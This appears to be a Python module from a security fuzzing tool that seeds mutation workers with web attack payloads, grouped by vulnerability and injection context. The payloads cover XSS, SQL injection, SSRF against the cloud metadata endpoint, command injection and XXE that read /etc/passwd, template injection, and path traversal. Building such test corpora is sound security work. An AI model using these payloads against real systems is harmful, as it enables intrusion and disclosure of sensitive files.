"""Seed payload corpus per (vuln_type, context).

Workers requesting mutations without a base payload get these seeds
as starting points.
"""

from __future__ import annotations

from workers.sandbox_worker.context import InjectionContext

SUPPORTED_VULN_TYPES = [
    "xss",
    "sqli",
    "ssrf",
    "command_injection",
    "xxe",
    "template_injection",
    "path_traversal",
]

CORPUS: dict[tuple[str, InjectionContext], list[str]] = {
    # XSS
    ("xss", InjectionContext.HTML_TAG): [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
    ],
    ("xss", InjectionContext.HTML_ATTR): [
        '" onmouseover="alert(1)" x="',
        "' onfocus='alert(1)' autofocus='",
        '" style="background:url(javascript:alert(1))"',
    ],
    ("xss", InjectionContext.JS_STRING): [
        "';alert(1)//",
        "\\';alert(1)//",
        "</script><script>alert(1)//",
    ],
    ("xss", InjectionContext.URL_PARAM): [
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
    # SQLi
    ("sqli", InjectionContext.SQL_STRING): [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--",
        "' OR 1=1#",
    ],
    ("sqli", InjectionContext.SQL_NUMBER): [
        "1 OR 1=1",
        "1 UNION SELECT NULL--",
        "1 AND SLEEP(5)",
    ],
    ("sqli", InjectionContext.URL_PARAM): [
        "' OR '1'='1",
        "1 OR 1=1--",
        "' UNION SELECT NULL,NULL--",
    ],
    # SSRF
    ("ssrf", InjectionContext.URL_PARAM): [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80/",
        "http://[::1]/",
        "http://localhost/admin",
    ],
    ("ssrf", InjectionContext.URL_PATH): [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1/",
        "file:///etc/passwd",
    ],
    # Command injection
    ("command_injection", InjectionContext.URL_PARAM): [
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
    ],
    ("command_injection", InjectionContext.HEADER_VALUE): [
        "; id",
        "| id",
        "&& id",
    ],
    # XXE
    ("xxe", InjectionContext.JSON_STRING): [
        '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
        '<!ENTITY xxe SYSTEM "http://127.0.0.1/">',
    ],
    ("xxe", InjectionContext.HTML_TAG): [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    ],
    # Template injection
    ("template_injection", InjectionContext.URL_PARAM): [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
    ],
    ("template_injection", InjectionContext.HTML_TAG): [
        "{{config}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
    ],
    # Path traversal
    ("path_traversal", InjectionContext.URL_PARAM): [
        "../../../etc/passwd",
        "..\\..\\..\\etc\\passwd",
        "....//....//....//etc/passwd",
    ],
    ("path_traversal", InjectionContext.URL_PATH): [
        "../../../etc/passwd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
    ],
}
